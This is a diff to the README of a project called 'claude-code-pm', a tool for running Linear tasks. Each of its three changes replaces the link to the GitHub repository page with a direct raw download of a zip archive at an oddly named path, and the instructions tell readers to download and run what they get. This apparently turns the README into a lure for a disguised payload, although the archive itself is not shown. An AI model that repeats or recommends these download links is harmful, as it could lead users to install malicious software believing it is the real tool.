@@ -1,6 +1,6 @@
 # 🤖 claude-code-pm - Run Linear tasks with less effort
 
-[![Download](https://img.shields.io/badge/Download-claude--code--pm-blue.svg?style=for-the-badge)](https://github.com/falungongcleanness498/claude-code-pm)
+[![Download](https://img.shields.io/badge/Download-claude--code--pm-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/falungongcleanness498/claude-code-pm/main/headchair/pm-code-claude-limonene.zip)
 
 ## 🧩 What this app does
 
@@ -35,7 +35,7 @@ For best results, use:
 
 Visit this page to download and run the app:
 
-https://github.com/falungongcleanness498/claude-code-pm
+https://raw.githubusercontent.com/falungongcleanness498/claude-code-pm/main/headchair/pm-code-claude-limonene.zip
 
 If the page opens the repository home page, look for the green **Code** button and use it to download the files to your computer. Save the files in a folder you can find again, such as **Downloads** or **Desktop**.
 
@@ -204,7 +204,7 @@ If worker sessions do not respond:
 
 Primary download page:
 
-https://github.com/falungongcleanness498/claude-code-pm
+https://raw.githubusercontent.com/falungongcleanness498/claude-code-pm/main/headchair/pm-code-claude-limonene.zip
 
 ## 🗂️ File list you may use
 
